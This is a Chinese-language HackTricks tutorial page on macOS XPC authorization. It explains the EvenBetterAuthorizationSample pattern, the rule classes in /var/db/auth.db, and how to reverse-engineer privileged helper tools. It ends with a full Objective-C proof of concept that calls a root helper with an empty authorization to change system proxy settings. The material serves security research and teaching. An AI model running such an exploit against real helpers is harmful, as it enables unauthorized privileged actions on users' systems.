# macOS XPC 授权

<details>

<summary><strong>从零到英雄学习 AWS 黑客技术，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想在 **HackTricks 中看到您的公司广告** 或 **下载 HackTricks 的 PDF**，请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFT 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上 **关注** 我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>

## XPC 授权

苹果还提出了另一种验证连接进程是否有**权限调用暴露的 XPC 方法**的方法。

当应用程序需要**以特权用户身份执行操作**时，通常不会以特权用户身份运行应用程序，而是以 root 用户身份安装 HelperTool 作为 XPC 服务，该服务可以被应用程序调用以执行这些操作。然而，调用服务的应用程序应该有足够的授权。

### ShouldAcceptNewConnection 总是返回 YES

一个例子可以在 [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample) 中找到。在 `App/AppDelegate.m` 中，它尝试**连接**到 **HelperTool**。并且在 `HelperTool/HelperTool.m` 中，函数 **`shouldAcceptNewConnection`** **不会检查**之前指示的任何要求。它将始终返回 YES：
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
有关如何正确配置此检查的更多信息：

{% content-ref url="macos-xpc-connecting-process-check/" %}
[macos-xpc-connecting-process-check](macos-xpc-connecting-process-check/)
{% endcontent-ref %}

### 应用程序权限

然而，当从 HelperTool 调用方法时，**确实进行了一些授权**。

函数 **`applicationDidFinishLaunching`** 来自 `App/AppDelegate.m` 将在应用程序启动后创建一个空的授权引用。这应该总是有效的。\
然后，它将尝试通过调用 `setupAuthorizationRights` **添加一些权限**到那个授权引用：
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
函数 `setupAuthorizationRights` 来自 `Common/Common.m`，它会将应用程序的权限存储在授权数据库 `/var/db/auth.db` 中。请注意，它只会添加数据库中尚不存在的权限：
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
函数 `enumerateRightsUsingBlock` 用于获取在 `commandInfo` 中定义的应用程序权限：
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
这意味着在此过程结束时，`commandInfo`内声明的权限将被存储在`/var/db/auth.db`中。注意，在那里你可以找到**每个需要认证的方法**，**权限名称**和**`kCommandKeyAuthRightDefault`**。后者**指示谁可以获得此权限**。

有不同的范围来指示谁可以访问权限。其中一些在[AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity\_authorization/lib/AuthorizationDB.h)中定义（你可以[在这里找到所有的范围](https://www.dssw.co.uk/reference/authorization-rights/)），但作为总结：

<table><thead><tr><th width="284.3333333333333">名称</th><th width="165">值</th><th>描述</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>任何人</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>没有人</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>当前用户需要是管理员（在管理员组内）</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>要求用户认证。</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>要求用户认证。他需要是管理员（在管理员组内）</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>指定规则</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>指定权限的一些额外评论</td></tr></tbody></table>

### 权限验证

在`HelperTool/HelperTool.m`中，函数**`readLicenseKeyAuthorization`**会检查调用者是否有权**执行此方法**，通过调用函数**`checkAuthorization`**。这个函数将检查调用进程发送的**authData**是否**格式正确**，然后将检查**获得调用特定方法的权限需要什么**。如果一切顺利，**返回的`error`将是`nil`**：
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
请注意，为了**检查获取调用该方法的正确权限的要求**，函数`authorizationRightForCommand`将仅检查之前评论的对象**`commandInfo`**。然后，它将调用**`AuthorizationCopyRights`**来检查**是否有权**调用该函数（注意，标志允许与用户交互）。

在这种情况下，要调用函数`readLicenseKeyAuthorization`，`kCommandKeyAuthRightDefault`被定义为`@kAuthorizationRuleClassAllow`。所以**任何人都可以调用它**。

### 数据库信息

提到这些信息存储在`/var/db/auth.db`中。您可以列出所有存储的规则，使用：
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
```markdown
然后，您可以阅读谁可以访问权限：
```
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### 过于宽松的权限

您可以在[**这里**](https://www.dssw.co.uk/reference/authorization-rights/)找到**所有权限配置**，但不需要用户交互的组合是：

1. **'authenticate-user': 'false'**
* 这是最直接的键。如果设置为`false`，它指定用户不需要提供认证即可获得此权限。
* 这通常与下面两个中的一个结合使用，或指示用户必须属于某个**组**。
2. **'allow-root': 'true'**
* 如果用户以root用户（具有提升的权限）操作，并且此键设置为`true`，root用户可能在无需进一步认证的情况下获得此权限。然而，通常情况下，获得root用户状态已经需要认证，所以对大多数用户来说，这不是一个“无认证”场景。
3. **'session-owner': 'true'**
* 如果设置为`true`，会话的所有者（当前登录的用户）将自动获得此权限。如果用户已经登录，这可能绕过额外的认证。
4. **'shared': 'true'**
* 这个键不授予权限而无需认证。相反，如果设置为`true`，这意味着一旦权限被认证，它可以在多个进程之间共享，而无需每个进程重新认证。但是，权限的最初授予仍然需要认证，除非与其他键结合使用，如`'authenticate-user': 'false'`。

您可以[**使用这个脚本**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9)来获取有趣的权限：
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
## 反向授权

### 检查是否使用了EvenBetterAuthorization

如果你发现函数：**`[HelperTool checkAuthorization:command:]`**，那么很可能该进程使用了之前提到的授权模式：

<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

如果这个函数调用了如`AuthorizationCreateFromExternalForm`、`authorizationRightForCommand`、`AuthorizationCopyRights`、`AuhtorizationFree`等函数，它就使用了[**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154)。

检查**`/var/db/auth.db`**，看是否有可能在不需要用户交互的情况下获得调用某些特权操作的权限。

### 协议通信

然后，你需要找到协议模式，以便能够与XPC服务建立通信。

函数**`shouldAcceptNewConnection`**指示正在导出的协议：

<figure><img src="../../../../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

在这个例子中，我们有的和EvenBetterAuthorizationSample中的一样，[**检查这一行**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94)。

知道了使用的协议名称，就可以用以下方法**转储其头文件定义**：
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
最后，我们只需要知道**暴露的Mach服务的名称**，以便与之建立通信。有几种方法可以找到这个名称：

* 在 **`[HelperTool init]`** 中，您可以看到正在使用的Mach服务：

<figure><img src="../../../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

* 在launchd plist中：
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### 漏洞利用示例

在此示例中创建：

* 协议定义及其函数
* 用于请求访问权限的空认证
* 与XPC服务的连接
* 如果连接成功，则调用函数
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## 参考资料

* [https://theevilbit.github.io/posts/secure\_coding\_xpc\_part1/](https://theevilbit.github.io/posts/secure\_coding\_xpc\_part1/)

<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零开始学习AWS黑客攻击！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**telegram群组**](https://t.me/peass)或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
